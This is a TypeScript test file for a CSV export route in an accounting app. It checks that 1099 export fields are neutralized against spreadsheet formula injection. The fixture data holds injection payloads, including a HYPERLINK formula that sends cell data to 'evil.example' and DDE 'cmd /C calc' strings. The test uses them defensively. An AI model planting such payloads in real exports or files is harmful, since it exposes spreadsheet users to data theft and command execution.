import assert from "node:assert/strict";
import { stubModules } from "../../../../../../testing/stub-modules";
import test from "node:test";
import { NextResponse } from "next/server";

interface ExportState {
  authz: { user: { orgId: string; id: string } } | null;
  dbCalls: number;
}

const FILING_ID = "11111111-1111-4111-8111-111111111111";
const stateKey = Symbol.for("openbooks.information-return-export-route-test");
const exportState: ExportState = {
  authz: { user: { orgId: "org-1", id: "user-1" } },
  dbCalls: 0,
};
(globalThis as typeof globalThis & Record<symbol, unknown>)[stateKey] =
  exportState;
(
  globalThis as typeof globalThis & Record<string, unknown>
).openbooksInformationReturnExportNextResponse = NextResponse;

stubModules({
  navigation: false,
  intl: false,
  authz: false,
  features: false,
  extra: {
    "@/lib/authz": `
      const state = globalThis[Symbol.for("openbooks.information-return-export-route-test")]
      const NextResponse = globalThis.openbooksInformationReturnExportNextResponse
      export async function guardPermission() {
        if (!state.authz) return NextResponse.json({ error: "forbidden" }, { status: 403 })
        return state.authz
      }
      export function guardSubsidiaryScope(authz, subsidiaryId) {
        const scope = authz?.allowedSubsidiaryIds ?? null
        if (scope === null) return null
        if (subsidiaryId && scope.has(subsidiaryId)) return null
        return NextResponse.json({ error: "not_found" }, { status: 404 })
      }
    `,
    "@/lib/compliance": `
      export async function guardComplianceFeature() { return null }
      export async function loadInformationReturnFilingScope() { return { subsidiaryId: null } }
    `,
    "@openbooks/engine/src/platform/business-date.ts": `
      export async function businessToday() { return "2026-08-28" }
    `,
    "@openbooks/engine/src/platform/db.ts": `
      const state = globalThis[Symbol.for("openbooks.information-return-export-route-test")]
      export const db = {
        async execute() {
          state.dbCalls++
          if (state.dbCalls === 1) {
            return { rows: [{
              tax_year: 2025,
              form_type: "1099-NEC",
              currency: "USD",
              status: "computed",
              payer_name: '=HYPERLINK("https://evil.example/?x="&A1,"click")',
            }] }
          }
          if (state.dbCalls === 2) {
            return { rows: [{
              name: "+CMD|' /C calc'!A0",
              display_name: "-2+2",
              tin_last4: "1234",
              tin_type: "@SUM(1,1)",
              tax_classification: "normal",
              address: {
                line1: "\\t=cmd|'/C calc'!A0",
                line2: "Acme Services",
                city: "Toronto",
                region: "ON",
                postalCode: "M5V 2T6",
                country: "CA",
              },
              computed_amounts: { nec1: "-42.50" },
              adjustments: {},
              tax_withheld: "0",
              corrected: false,
            }] }
          }
          throw new Error("unexpected database query")
        },
      }
    `,
    "@openbooks/engine/src/compliance/information-returns.ts": `
      export function formDefinition() {
        return { boxes: [{ number: "1", key: "nec1" }] }
      }
      export function filedBoxAmounts() { return { nec1: "-42.50" } }
    `,
  },
});

const routeUrl = "./route.ts?csv-formula-injection-test";
const { GET } = (await import(routeUrl)) as typeof import("./route.ts");

/** Parse one CSV document while preserving quoted commas and newlines. */
function parseCsv(csv: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = "";
  let quoted = false;
  for (let i = 0; i < csv.length; i++) {
    const char = csv[i]!;
    if (quoted) {
      if (char === '"') {
        if (csv[i + 1] === '"') {
          cell += '"';
          i++;
        } else {
          quoted = false;
        }
      } else {
        cell += char;
      }
      continue;
    }
    if (char === '"' && cell.length === 0) {
      quoted = true;
    } else if (char === ",") {
      row.push(cell);
      cell = "";
    } else if (char === "\n") {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = "";
    } else if (char !== "\r") {
      cell += char;
    }
  }
  if (cell.length > 0 || row.length > 0) {
    row.push(cell);
    rows.push(row);
  }
  return rows;
}

test("GET neutralizes formula-leading filing and recipient text in CSV exports", async () => {
  exportState.authz = { user: { orgId: "org-1", id: "user-1" } };
  exportState.dbCalls = 0;

  const response = await GET(
    new Request(
      `http://openbooks.test/api/compliance/information-returns/${FILING_ID}/export`,
    ),
    {
      params: Promise.resolve({ id: FILING_ID }),
    },
  );

  assert.equal(response.status, 200);
  assert.equal(response.headers.get("content-type"), "text/csv; charset=utf-8");
  const rows = parseCsv(await response.text());
  assert.equal(rows.length, 2);

  const header = rows[0]!;
  const data = rows[1]!;
  const index = (name: string) => header.indexOf(name);

  // Apostrophe neutralization keeps these values visibly intact while making
  // spreadsheet applications treat them as literal text, even when quoted.
  assert.equal(
    data[index("payer_name")],
    '\'=HYPERLINK("https://evil.example/?x="&A1,"click")',
  );
  assert.equal(data[index("recipient_legal_name")], "'+CMD|' /C calc'!A0");
  assert.equal(data[index("recipient_display_name")], "'-2+2");
  assert.equal(data[index("tin_type")], "'@SUM(1,1)");
  assert.equal(data[index("address_line1")], "'\t=cmd|'/C calc'!A0");

  // A legitimate negative amount must remain a number-like CSV value rather
  // than being altered along with formula-shaped user-authored text.
  assert.equal(data[index("box_1")], "-42.50");
  assert.equal(data[index("address_line2")], "Acme Services");
});

test("GET refuses unauthenticated export requests", async () => {
  exportState.authz = null;
  exportState.dbCalls = 0;
  const response = await GET(
    new Request(
      `http://openbooks.test/api/compliance/information-returns/${FILING_ID}/export`,
    ),
    {
      params: Promise.resolve({ id: FILING_ID }),
    },
  );
  assert.equal(response.status, 403);
  assert.equal(exportState.dbCalls, 0);
  exportState.authz = { user: { orgId: "org-1", id: "user-1" } };
});
